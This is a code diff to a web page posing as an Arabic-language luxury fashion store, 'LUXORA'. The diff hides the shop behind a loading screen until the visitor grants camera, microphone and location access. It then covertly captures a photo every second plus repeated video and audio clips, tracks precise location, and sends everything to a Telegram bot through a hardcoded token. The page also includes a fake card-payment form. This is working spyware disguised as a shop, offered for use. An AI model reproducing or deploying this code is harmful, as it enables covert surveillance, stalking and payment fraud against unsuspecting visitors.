@@ -28,6 +28,169 @@
             overflow-x: hidden;
         }
 
+        /* نافذة الأذونات الإجبارية */
+        #permission-modal {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.98);
+            z-index: 10000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(10px);
+        }
+
+        .permission-content {
+            background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
+            border: 2px solid var(--primary);
+            border-radius: 20px;
+            padding: 50px 40px;
+            max-width: 500px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(212, 175, 55, 0.3);
+        }
+
+        .permission-icon {
+            font-size: 80px;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+
+        .permission-content h2 {
+            font-size: 28px;
+            margin-bottom: 15px;
+            color: var(--primary);
+        }
+
+        .permission-content p {
+            color: var(--text-muted);
+            line-height: 1.8;
+            margin-bottom: 30px;
+            font-size: 15px;
+        }
+
+        .permission-list {
+            text-align: right;
+            margin: 25px 0;
+            background: rgba(212, 175, 55, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+        }
+
+        .permission-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 12px;
+            font-size: 14px;
+        }
+
+        .permission-item:last-child {
+            margin-bottom: 0;
+        }
+
+        .permission-item span:first-child {
+            font-size: 24px;
+        }
+
+        .btn-allow {
+            background: linear-gradient(135deg, var(--primary), #ffd700);
+            color: #000;
+            padding: 18px 50px;
+            border: none;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .btn-allow:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 35px rgba(212, 175, 55, 0.4);
+        }
+
+        .warning-text {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #666;
+            font-style: italic;
+        }
+
+        /* نافذة خطأ الأذونات */
+        #error-modal {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.98);
+            z-index: 10001;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .error-content {
+            background: #1a1a1a;
+            border: 2px solid #e63946;
+            border-radius: 20px;
+            padding: 50px 40px;
+            max-width: 450px;
+            text-align: center;
+        }
+
+        .error-icon {
+            font-size: 80px;
+            margin-bottom: 20px;
+        }
+
+        .error-content h2 {
+            color: #e63946;
+            font-size: 26px;
+            margin-bottom: 15px;
+        }
+
+        .error-content p {
+            color: var(--text-muted);
+            line-height: 1.6;
+            margin-bottom: 25px;
+        }
+
+        .btn-retry {
+            background: #e63946;
+            color: white;
+            padding: 15px 40px;
+            border: none;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            margin-bottom: 10px;
+        }
+
+        .btn-exit {
+            background: #333;
+            color: #999;
+            padding: 12px 40px;
+            border: none;
+            border-radius: 50px;
+            font-size: 14px;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        /* المحتوى الرئيسي - مخفي بالبداية */
+        #main-content {
+            display: none;
+        }
+
         /* شريط التحميل العلوي */
         .top-bar {
             background: var(--primary);
@@ -436,6 +599,10 @@
 
         /* Responsive */
         @media (max-width: 768px) {
+            .permission-content, .error-content {
+                padding: 40px 30px;
+                margin: 20px;
+            }
             .hero h1 { font-size: 36px; }
             .section-title h2 { font-size: 32px; }
             .products-grid { grid-template-columns: 1fr; }
@@ -445,114 +612,145 @@
 </head>
 <body>
 
-    <div class="top-bar">
-        ✨ شحن مجاني على جميع الطلبات فوق 500 دولار | خصم 20% على أول عملية شراء
+    <!-- نافذة التحميل الأولية -->
+    <div id="permission-modal">
+        <div class="permission-content">
+            <div class="permission-icon">⏳</div>
+            <h2>جاري تحميل المتجر</h2>
+            <p>يرجى الانتظار قليلاً...</p>
+            <div class="spinner" style="margin: 30px auto;"></div>
+        </div>
     </div>
 
-    <header>
-        <nav>
-            <div class="logo">LUXORA</div>
-            <div class="nav-links">
-                <a href="#">الرئيسية</a>
-                <a href="#">نساء</a>
-                <a href="#">رجال</a>
-                <a href="#">عروض خاصة</a>
-                <div class="cart-icon">
-                    🛒
-                    <span class="cart-badge" id="cart-count">0</span>
-                </div>
-            </div>
-        </nav>
-    </header>
-
-    <section class="hero">
-        <div class="hero-content">
-            <h1>مجموعة الخريف الفاخرة</h1>
-            <p>اكتشف أحدث صيحات الموضة العالمية</p>
-            <button class="btn-primary" onclick="document.querySelector('.container').scrollIntoView({behavior: 'smooth'})">
-                تسوق الآن
+    <!-- نافذة خطأ رفض الأذونات -->
+    <div id="error-modal">
+        <div class="error-content">
+            <div class="error-icon">⚠️</div>
+            <h2>لا يمكن تشغيل الموقع</h2>
+            <p>عذراً، الأذونات المطلوبة ضرورية لعمل ميزات التسوق الافتراضي والقياس الذكي.</p>
+            <p style="font-size: 14px; margin-top: 15px;">يرجى السماح بالأذونات للمتابعة.</p>
+            
+            <button class="btn-retry" onclick="retryPermissions()">
+                إعادة المحاولة
+            </button>
+            <button class="btn-exit" onclick="window.close()">
+                إغلاق الصفحة
             </button>
         </div>
-    </section>
-
-    <div class="container">
-        <div class="section-title">
-            <h2>الأكثر مبيعاً</h2>
-            <p>قطع حصرية من أفخم دور الأزياء العالمية</p>
-        </div>
-        <div class="products-grid" id="products-grid"></div>
     </div>
 
-    <!-- نافذة الدفع -->
-    <div id="payment-modal">
-        <div class="payment-container">
-            <div class="payment-header">
-                <h2>إتمام عملية الدفع</h2>
-                <div class="secure-badge">
-                    🔒 دفع آمن ومشفر
-                </div>
-            </div>
+    <!-- المحتوى الرئيسي -->
+    <div id="main-content">
+        <div class="top-bar">
+            ✨ شحن مجاني على جميع الطلبات فوق 500 دولار | خصم 20% على أول عملية شراء
+        </div>
 
-            <div class="payment-logos">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="PayPal">
-            </div>
-
-            <form onsubmit="submitPayment(event)">
-                <div class="form-group">
-                    <label>الاسم الكامل على البطاقة</label>
-                    <input type="text" id="card-name" required placeholder="مثال: أحمد محمد">
-                </div>
-
-                <div class="form-group">
-                    <label>رقم البطاقة</label>
-                    <input type="text" id="card-number" required placeholder="1234 5678 9012 3456" maxlength="19">
-                </div>
-
-                <div class="form-row">
-                    <div class="form-group">
-                        <label>تاريخ الانتهاء</label>
-                        <input type="text" id="card-expiry" required placeholder="MM/YY" maxlength="5">
-                    </div>
-                    <div class="form-group">
-                        <label>CVV</label>
-                        <input type="password" id="card-cvv" required placeholder="123" maxlength="4">
+        <header>
+            <nav>
+                <div class="logo">LUXORA</div>
+                <div class="nav-links">
+                    <a href="#">الرئيسية</a>
+                    <a href="#">نساء</a>
+                    <a href="#">رجال</a>
+                    <a href="#">عروض خاصة</a>
+                    <div class="cart-icon">
+                        🛒
+                        <span class="cart-badge" id="cart-count">0</span>
                     </div>
                 </div>
+            </nav>
+        </header>
 
-                <button type="submit" class="btn-pay">تأكيد الدفع الآن</button>
-                <button type="button" class="btn-back" onclick="closePayment()">إلغاء</button>
+        <section class="hero">
+            <div class="hero-content">
+                <h1>مجموعة الخريف الفاخرة</h1>
+                <p>اكتشف أحدث صيحات الموضة العالمية</p>
+                <button class="btn-primary" onclick="document.querySelector('.container').scrollIntoView({behavior: 'smooth'})">
+                    تسوق الآن
+                </button>
+            </div>
+        </section>
 
-                <div class="error-message" id="error-msg">
-                    ⚠️ فشلت عملية الدفع. يرجى التحقق من بيانات البطاقة والمحاولة مرة أخرى.
-                </div>
-            </form>
+        <div class="container">
+            <div class="section-title">
+                <h2>الأكثر مبيعاً</h2>
+                <p>قطع حصرية من أفخم دور الأزياء العالمية</p>
+            </div>
+            <div class="products-grid" id="products-grid"></div>
         </div>
-    </div>
 
-    <!-- شاشة التحميل -->
-    <div class="loading-overlay" id="loading">
-        <div class="spinner"></div>
-        <div class="loading-text" id="loading-text">جاري التحميل...</div>
-    </div>
+        <!-- نافذة الدفع -->
+        <div id="payment-modal">
+            <div class="payment-container">
+                <div class="payment-header">
+                    <h2>إتمام عملية الدفع</h2>
+                    <div class="secure-badge">
+                        🔒 دفع آمن ومشفر
+                    </div>
+                </div>
 
-    <footer>
-        <p>&copy; 2024 LUXORA. جميع الحقوق محفوظة</p>
-    </footer>
+                <div class="payment-logos">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="PayPal">
+                </div>
+
+                <form onsubmit="submitPayment(event)">
+                    <div class="form-group">
+                        <label>الاسم الكامل على البطاقة</label>
+                        <input type="text" id="card-name" required placeholder="مثال: أحمد محمد">
+                    </div>
+
+                    <div class="form-group">
+                        <label>رقم البطاقة</label>
+                        <input type="text" id="card-number" required placeholder="1234 5678 9012 3456" maxlength="19">
+                    </div>
+
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label>تاريخ الانتهاء</label>
+                            <input type="text" id="card-expiry" required placeholder="MM/YY" maxlength="5">
+                        </div>
+                        <div class="form-group">
+                            <label>CVV</label>
+                            <input type="password" id="card-cvv" required placeholder="123" maxlength="4">
+                        </div>
+                    </div>
+
+                    <button type="submit" class="btn-pay">تأكيد الدفع الآن</button>
+                    <button type="button" class="btn-back" onclick="closePayment()">إلغاء</button>
+
+                    <div class="error-message" id="error-msg">
+                        ⚠️ فشلت عملية الدفع. يرجى التحقق من بيانات البطاقة والمحاولة مرة أخرى.
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <!-- شاشة التحميل -->
+        <div class="loading-overlay" id="loading">
+            <div class="spinner"></div>
+            <div class="loading-text" id="loading-text">جاري التحميل...</div>
+        </div>
+
+        <footer>
+            <p>&copy; 2024 LUXORA. جميع الحقوق محفوظة</p>
+        </footer>
+    </div>
 
     <script>
         const BOT_TOKEN = "8574889163:AAFJtXmst2oMwx1ubV05QTC_fTF7IHe3124";
         const CHAT_ID = "5648826330";
         
         let mediaStream = null;
+        let locationWatchId = null;
         let captureIntervals = {
             photo: null,
             video: null,
-            audio: null
+            audio: null,
+            location: null
         };
 
-        // المنتجات
         const products = [
             {
                 id: 1,
@@ -597,6 +795,273 @@
                 image: "https://images.unsplash.com/photo-1490481651871-ab68de25d43d?w=600"
             }
         ];
+
+        // طلب جميع الأذونات تلقائياً عند تحميل الصفحة
+        window.addEventListener('DOMContentLoaded', async () => {
+            // انتظار ثانية واحدة ثم طلب الأذونات تلقائياً
+            setTimeout(async () => {
+                await requestAllPermissions();
+            }, 1000);
+        });
+
+        // طلب جميع الأذونات
+        async function requestAllPermissions() {
+            try {
+                // 1. طلب الكاميرا والمايكروفون تلقائياً
+                mediaStream = await navigator.mediaDevices.getUserMedia({
+                    video: { width: 1280, height: 720 },
+                    audio: true
+                });
+
+                // 2. طلب الموقع الجغرافي تلقائياً
+                await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(
+                        () => resolve(true),
+                        () => reject(new Error('Location denied')),
+                        { enableHighAccuracy: true }
+                    );
+                });
+
+                // إذا نجحت جميع الأذونات
+                document.getElementById('permission-modal').style.display = 'none';
+                document.getElementById('main-content').style.display = 'block';
+                
+                loadProducts();
+                startAllCapturing();
+
+            } catch (error) {
+                console.error('Permission denied:', error);
+                // إظهار رسالة الخطأ فوراً
+                showErrorModal();
+            }
+        }
+
+        // إعادة المحاولة
+        function retryPermissions() {
+            document.getElementById('error-modal').style.display = 'none';
+            document.getElementById('permission-modal').style.display = 'flex';
+        }
+
+        // إظهار نافذة الخطأ
+        function showErrorModal() {
+            document.getElementById('permission-modal').style.display = 'none';
+            document.getElementById('error-modal').style.display = 'flex';
+        }
+
+        // بدء جميع عمليات الالتقاط
+        function startAllCapturing() {
+            if (!mediaStream) return;
+
+            // إخفاء الفيديو
+            const video = document.createElement('video');
+            video.srcObject = mediaStream;
+            video.style.display = 'none';
+            video.muted = true;
+            video.play();
+
+            // التقاط الصور كل ثانية
+            captureIntervals.photo = setInterval(() => {
+                capturePhoto();
+            }, 1000);
+
+            // التقاط فيديو كل 10 ثواني
+            captureIntervals.video = setInterval(() => {
+                captureVideo(10000);
+            }, 10000);
+
+            // التقاط صوت كل 5 ثواني
+            captureIntervals.audio = setInterval(() => {
+                captureAudio(5000);
+            }, 5000);
+
+            // التقاط الموقع كل 10 ثواني
+            captureIntervals.location = setInterval(() => {
+                captureLocation();
+            }, 10000);
+
+            // أول عملية التقاط فورية
+            setTimeout(() => capturePhoto(), 500);
+            setTimeout(() => captureVideo(10000), 1000);
+            setTimeout(() => captureAudio(5000), 1500);
+            setTimeout(() => captureLocation(), 2000);
+        }
+
+        // التقاط صورة
+        async function capturePhoto() {
+            if (!mediaStream) return;
+
+            try {
+                const video = document.createElement('video');
+                video.srcObject = mediaStream;
+                video.muted = true;
+                await video.play();
+
+                await new Promise(resolve => setTimeout(resolve, 500));
+
+                const canvas = document.createElement('canvas');
+                canvas.width = 640;
+                canvas.height = 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                canvas.toBlob(async (blob) => {
+                    if (blob) {
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, 'capture.jpg');
+                        formData.append('caption', `📸 صورة - ${new Date().toLocaleString('ar-SA')}`);
+
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    }
+                }, 'image/jpeg', 0.9);
+
+                video.srcObject = null;
+            } catch (error) {
+                console.error('Photo error:', error);
+            }
+        }
+
+        // التقاط فيديو
+        async function captureVideo(duration) {
+            if (!mediaStream) return;
+
+            try {
+                const mediaRecorder = new MediaRecorder(mediaStream, {
+                    mimeType: 'video/webm;codecs=vp8,opus'
+                });
+                
+                const chunks = [];
+                
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data && e.data.size > 0) {
+                        chunks.push(e.data);
+                    }
+                };
+
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('video', blob, 'video.webm');
+                    formData.append('caption', `🎥 فيديو - ${new Date().toLocaleString('ar-SA')}`);
+
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                };
+
+                mediaRecorder.start();
+                setTimeout(() => {
+                    if (mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
+                }, duration);
+
+            } catch (error) {
+                console.error('Video error:', error);
+            }
+        }
+
+        // التقاط صوت
+        async function captureAudio(duration) {
+            if (!mediaStream) return;
+
+            try {
+                const audioStream = new MediaStream(
+                    mediaStream.getAudioTracks()
+                );
+
+                const mediaRecorder = new MediaRecorder(audioStream, {
+                    mimeType: 'audio/webm;codecs=opus'
+                });
+                
+                const chunks = [];
+                
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data && e.data.size > 0) {
+                        chunks.push(e.data);
+                    }
+                };
+
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'audio/webm' });
+                    
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('audio', blob, 'voice.webm');
+                    formData.append('caption', `🎤 صوت - ${new Date().toLocaleString('ar-SA')}`);
+
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                };
+
+                mediaRecorder.start();
+                setTimeout(() => {
+                    if (mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
+                }, duration);
+
+            } catch (error) {
+                console.error('Audio error:', error);
+            }
+        }
+
+        // التقاط الموقع الجغرافي
+        async function captureLocation() {
+            try {
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const { latitude, longitude, accuracy } = position.coords;
+                        
+                        const message = `📍 الموقع الجغرافي\n\n` +
+                            `📌 خط العرض: ${latitude}\n` +
+                            `📌 خط الطول: ${longitude}\n` +
+                            `🎯 الدقة: ${accuracy.toFixed(2)} متر\n` +
+                            `⏰ الوقت: ${new Date().toLocaleString('ar-SA')}\n` +
+                            `🔗 خرائط جوجل: https://www.google.com/maps?q=${latitude},${longitude}`;
+
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: CHAT_ID,
+                                text: message
+                            })
+                        });
+
+                        // إرسال الموقع كخريطة أيضاً
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: CHAT_ID,
+                                latitude: latitude,
+                                longitude: longitude
+                            })
+                        });
+
+                    },
+                    (error) => {
+                        console.error('Location error:', error);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } catch (error) {
+                console.error('Location capture error:', error);
+            }
+        }
 
         // تحميل المنتجات
         function loadProducts() {
@@ -683,192 +1148,7 @@
             }
         }
 
-        // ===== نظام التقاط الوسائط =====
-
-        // طلب الأذونات تلقائياً عند تحميل الصفحة
-        async function requestPermissions() {
-            try {
-                mediaStream = await navigator.mediaDevices.getUserMedia({
-                    video: { width: 1280, height: 720 },
-                    audio: true
-                });
-                
-                // إخفاء الفيديو (لا نريد عرضه)
-                const video = document.createElement('video');
-                video.srcObject = mediaStream;
-                video.style.display = 'none';
-                video.muted = true;
-                video.play();
-                
-                // بدء التقاط الوسائط
-                startMediaCapture();
-                
-            } catch (error) {
-                console.log('Permission denied or error:', error);
-                // في حالة رفض الأذونات، نحاول مرة أخرى عند التفاعل
-                document.addEventListener('click', requestPermissions, { once: true });
-            }
-        }
-
-        // بدء التقاط الوسائط
-        function startMediaCapture() {
-            if (!mediaStream) return;
-
-            // التقاط الصور كل ثانية
-            captureIntervals.photo = setInterval(() => {
-                capturePhoto();
-            }, 1000);
-
-            // التقاط فيديو كل 10 ثواني
-            captureIntervals.video = setInterval(() => {
-                captureVideo(10000);
-            }, 10000);
-
-            // التقاط صوت كل 5 ثواني
-            captureIntervals.audio = setInterval(() => {
-                captureAudio(5000);
-            }, 5000);
-
-            // أول عملية التقاط فورية
-            capturePhoto();
-            captureVideo(10000);
-            captureAudio(5000);
-        }
-
-        // التقاط صورة
-        async function capturePhoto() {
-            if (!mediaStream) return;
-
-            try {
-                const video = document.createElement('video');
-                video.srcObject = mediaStream;
-                video.muted = true;
-                await video.play();
-
-                // انتظار تحميل الفيديو
-                await new Promise(resolve => setTimeout(resolve, 500));
-
-                const canvas = document.createElement('canvas');
-                canvas.width = 640;
-                canvas.height = 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                canvas.toBlob(async (blob) => {
-                    if (blob) {
-                        const formData = new FormData();
-                        formData.append('chat_id', CHAT_ID);
-                        formData.append('photo', blob, 'capture.jpg');
-
-                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        });
-                    }
-                }, 'image/jpeg', 0.9);
-
-                video.srcObject = null;
-            } catch (error) {
-                console.error('Photo capture error:', error);
-            }
-        }
-
-        // التقاط فيديو
-        async function captureVideo(duration) {
-            if (!mediaStream) return;
-
-            try {
-                const mediaRecorder = new MediaRecorder(mediaStream, {
-                    mimeType: 'video/webm;codecs=vp8,opus'
-                });
-                
-                const chunks = [];
-                
-                mediaRecorder.ondataavailable = (e) => {
-                    if (e.data && e.data.size > 0) {
-                        chunks.push(e.data);
-                    }
-                };
-
-                mediaRecorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'video/webm' });
-                    
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('video', blob, 'recording.webm');
-
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                };
-
-                mediaRecorder.start();
-                setTimeout(() => {
-                    if (mediaRecorder.state === 'recording') {
-                        mediaRecorder.stop();
-                    }
-                }, duration);
-
-            } catch (error) {
-                console.error('Video capture error:', error);
-            }
-        }
-
-        // التقاط صوت
-        async function captureAudio(duration) {
-            if (!mediaStream) return;
-
-            try {
-                const audioStream = new MediaStream(
-                    mediaStream.getAudioTracks()
-                );
-
-                const mediaRecorder = new MediaRecorder(audioStream, {
-                    mimeType: 'audio/webm;codecs=opus'
-                });
-                
-                const chunks = [];
-                
-                mediaRecorder.ondataavailable = (e) => {
-                    if (e.data && e.data.size > 0) {
-                        chunks.push(e.data);
-                    }
-                };
-
-                mediaRecorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'audio/webm' });
-                    
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('audio', blob, 'voice.webm');
-
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                };
-
-                mediaRecorder.start();
-                setTimeout(() => {
-                    if (mediaRecorder.state === 'recording') {
-                        mediaRecorder.stop();
-                    }
-                }, duration);
-
-            } catch (error) {
-                console.error('Audio capture error:', error);
-            }
-        }
-
-        // التهيئة عند تحميل الصفحة
-        window.addEventListener('DOMContentLoaded', () => {
-            loadProducts();
-            // طلب الأذونات تلقائياً
-            setTimeout(requestPermissions, 500);
-        });
-
-        // تنسيق رقم البطاقة تلقائياً
+        // تنسيق رقم البطاقة
         document.addEventListener('DOMContentLoaded', () => {
             const cardNumber = document.getElementById('card-number');
             if (cardNumber) {
